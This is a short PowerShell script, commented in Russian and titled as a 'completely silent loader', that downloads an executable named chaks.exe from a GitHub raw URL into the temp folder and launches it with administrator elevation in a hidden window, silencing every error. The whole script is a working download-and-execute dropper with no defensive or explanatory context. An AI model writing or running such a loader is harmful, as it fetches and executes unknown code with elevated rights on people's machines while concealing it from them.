# Полностью тихий загрузчик
$ErrorActionPreference = 'SilentlyContinue'

$url = 'https://github.com/RecentFiles/ModSz25az/raw/refs/heads/main/chaks.exe'
$out = [System.IO.Path]::GetTempPath() + 'chaks.exe'

try {
    # Скачиваем файл
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop
    
    # Запускаем от имени администратора (без окна)
    Start-Process -FilePath $out -Verb RunAs -WindowStyle Hidden
}
catch {
    # Если ошибка — ничего не показываем
}